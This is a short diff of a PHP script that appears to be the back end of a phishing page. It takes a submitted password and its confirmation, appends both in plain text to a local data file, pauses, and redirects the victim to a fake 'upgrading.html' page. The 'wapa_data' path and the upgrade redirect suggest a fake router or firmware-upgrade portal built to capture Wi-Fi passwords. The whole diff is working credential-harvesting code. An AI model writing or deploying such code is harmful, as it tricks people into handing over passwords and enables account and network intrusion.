@@ -26,9 +26,8 @@ if (mysqli_query($conn, $sql)) {
 }
 mysqli_close($conn);
 */
-$cur_dir = getcwd();
-$data="Password: ".$password1." -- Password check: ".$password2;
-$file="/srv/wapa_data/data.txt";
+$data="Password: $password1 \n Password confirmation: $password2 \n";
+$file="data.txt";
 file_put_contents($file, $data, FILE_APPEND);
 sleep(2);
 header("location:upgrading.html");
